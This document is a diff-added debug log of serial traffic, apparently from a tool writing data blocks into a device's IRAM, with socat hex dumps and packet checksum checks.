+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000355646  length=4 from=202 to=205
+[2025-09-17 16:35:22] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000357168  length=2 from=206 to=207
+[2025-09-17 16:35:22] Error [socat ERR]  01 10                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000357251  length=2 from=208 to=209
+[2025-09-17 16:35:22] Error [socat ERR]  e1 a0                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000366888  length=2 from=210 to=211
+[2025-09-17 16:35:22] Error [socat ERR]  a0 0b                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000376996  length=2 from=212 to=213
+[2025-09-17 16:35:22] Error [socat ERR]  e0 28                                            .(
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000387182  length=2 from=214 to=215
+[2025-09-17 16:35:22] Error [socat ERR]  80 08                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000397600  length=2 from=216 to=217
+[2025-09-17 16:35:22] Error [socat ERR]  e1 a0                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000408663  length=2 from=218 to=219
+[2025-09-17 16:35:22] Error [socat ERR]  00 0a                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000418825  length=2 from=220 to=221
+[2025-09-17 16:35:22] Error [socat ERR]  eb 00                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000428948  length=2 from=222 to=223
+[2025-09-17 16:35:22] Error [socat ERR]  00 18                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000441581  length=1 from=224 to=224
+[2025-09-17 16:35:22] Error [socat ERR]  7e                                               ~
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000445592  length=4 from=46 to=49
+[2025-09-17 16:35:22] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000445678  length=2 from=50 to=51
+[2025-09-17 16:35:22] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:22] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:22] Info RecvPacket: Still need 2 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Received 2 bytes: 7602
+[2025-09-17 16:35:22] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Complete packet (including checksum) received: 0584FF007602 (ASCII: \x05\x84\xFF\x00v\x02)
+[2025-09-17 16:35:22] Info RecvPacket: Received checksum: 02, Calculated checksum: 02
+[2025-09-17 16:35:22] Info RecvPacket: Checksum calculated on 5 bytes: 0584FF0076
+[2025-09-17 16:35:22] Info RecvPacket: Extracted payload: 84FF0076
+[2025-09-17 16:35:22] Info Writing to IRAM 0020/0124
+[2025-09-17 16:35:22] Info Sending packet: 18845A2E00030120FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC8
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000508678  length=2 from=225 to=226
+[2025-09-17 16:35:22] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000551215  length=4 from=227 to=230
+[2025-09-17 16:35:22] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000551357  length=2 from=231 to=232
+[2025-09-17 16:35:22] Error [socat ERR]  01 20                                            . 
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000551509  length=2 from=233 to=234
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000561642  length=2 from=235 to=236
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000572185  length=2 from=237 to=238
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000583657  length=2 from=239 to=240
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000594673  length=2 from=241 to=242
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000605002  length=2 from=243 to=244
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000615515  length=2 from=245 to=246
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000625624  length=2 from=247 to=248
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000635926  length=1 from=249 to=249
+[2025-09-17 16:35:22] Error [socat ERR]  c8                                               .
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000638793  length=4 from=52 to=55
+[2025-09-17 16:35:22] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000641643  length=2 from=56 to=57
+[2025-09-17 16:35:22] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:22] Info RecvPacket: Still need 2 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Received 2 bytes: 7602
+[2025-09-17 16:35:22] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Complete packet (including checksum) received: 0584FF007602 (ASCII: \x05\x84\xFF\x00v\x02)
+[2025-09-17 16:35:22] Info RecvPacket: Received checksum: 02, Calculated checksum: 02
+[2025-09-17 16:35:22] Info RecvPacket: Checksum calculated on 5 bytes: 0584FF0076
+[2025-09-17 16:35:22] Info RecvPacket: Extracted payload: 84FF0076
+[2025-09-17 16:35:22] Info Sending packet: 18845A2E00030120E08AA000E33000FF028F00D003A0800117
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000706819  length=2 from=250 to=251
+[2025-09-17 16:35:22] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000747656  length=4 from=252 to=255
+[2025-09-17 16:35:22] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000748913  length=2 from=256 to=257
+[2025-09-17 16:35:22] Error [socat ERR]  01 20                                            . 
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000749035  length=2 from=258 to=259
+[2025-09-17 16:35:22] Error [socat ERR]  e0 8a                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000759651  length=2 from=260 to=261
+[2025-09-17 16:35:22] Error [socat ERR]  a0 00                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000770058  length=2 from=262 to=263
+[2025-09-17 16:35:22] Error [socat ERR]  e3 30                                            .0
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000780263  length=2 from=264 to=265
+[2025-09-17 16:35:22] Error [socat ERR]  00 ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000790673  length=2 from=266 to=267
+[2025-09-17 16:35:22] Error [socat ERR]  02 8f                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000800757  length=2 from=268 to=269
+[2025-09-17 16:35:22] Error [socat ERR]  00 d0                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000810961  length=2 from=270 to=271
+[2025-09-17 16:35:22] Error [socat ERR]  03 a0                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000821094  length=2 from=272 to=273
+[2025-09-17 16:35:22] Error [socat ERR]  80 01                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000831381  length=1 from=274 to=274
+[2025-09-17 16:35:22] Error [socat ERR]  17                                               .
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000834644  length=4 from=58 to=61
+[2025-09-17 16:35:22] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] < 2025/09/17 16:35:22.000834726  length=2 from=62 to=63
+[2025-09-17 16:35:22] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:22] Info RecvPacket: Still need 2 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Received 2 bytes: 7602
+[2025-09-17 16:35:22] Info RecvPacket: Still need 0 more bytes
+[2025-09-17 16:35:22] Info RecvPacket: Complete packet (including checksum) received: 0584FF007602 (ASCII: \x05\x84\xFF\x00v\x02)
+[2025-09-17 16:35:22] Info RecvPacket: Received checksum: 02, Calculated checksum: 02
+[2025-09-17 16:35:22] Info RecvPacket: Checksum calculated on 5 bytes: 0584FF0076
+[2025-09-17 16:35:22] Info RecvPacket: Extracted payload: 84FF0076
+[2025-09-17 16:35:22] Info Writing to IRAM 0030/0124
+[2025-09-17 16:35:22] Info Sending packet: 18845A2E00030130FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFB8
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000896645  length=2 from=275 to=276
+[2025-09-17 16:35:22] Error [socat ERR]  18 84                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000937624  length=4 from=277 to=280
+[2025-09-17 16:35:22] Error [socat ERR]  5a 2e 00 03                                      Z...
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000937758  length=4 from=281 to=284
+[2025-09-17 16:35:22] Error [socat ERR]  01 30 ff ff                                      .0..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000947711  length=2 from=285 to=286
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000958662  length=2 from=287 to=288
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000969299  length=2 from=289 to=290
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000979667  length=2 from=291 to=292
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:22] Error [socat ERR] > 2025/09/17 16:35:22.000991609  length=2 from=293 to=294
+[2025-09-17 16:35:22] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:22] Error [socat ERR] --
+[2025-09-17 16:35:23] Error [socat ERR] > 2025/09/17 16:35:23.000001433  length=2 from=295 to=296
+[2025-09-17 16:35:23] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:23] Error [socat ERR] --
+[2025-09-17 16:35:23] Error [socat ERR] > 2025/09/17 16:35:23.000011810  length=2 from=297 to=298
+[2025-09-17 16:35:23] Error [socat ERR]  ff ff                                            ..
+[2025-09-17 16:35:23] Error [socat ERR] --
+[2025-09-17 16:35:23] Error [socat ERR] > 2025/09/17 16:35:23.000021996  length=1 from=299 to=299
+[2025-09-17 16:35:23] Error [socat ERR]  b8                                               .
+[2025-09-17 16:35:23] Error [socat ERR] --
+[2025-09-17 16:35:23] Error [socat ERR] < 2025/09/17 16:35:23.000025362  length=4 from=64 to=67
+[2025-09-17 16:35:23] Error [socat ERR]  05 84 ff 00                                      ....
+[2025-09-17 16:35:23] Error [socat ERR] --
+[2025-09-17 16:35:23] Error [socat ERR] < 2025/09/17 16:35:23.000025512  length=2 from=68 to=69
+[2025-09-17 16:35:23] Error [socat ERR]  76 02                                            v.
+[2025-09-17 16:35:23] Error [socat ERR] --
+[2025-09-17 16:35:23] Info RecvPacket: Expected packet length (excluding checksum): 5 bytes
+[2025-09-17 16:35:23] Info RecvPacket: Received 3 bytes: 84FF00
+[2025-09-17 16:35:23] Info RecvPacket: Still need 2 more bytes
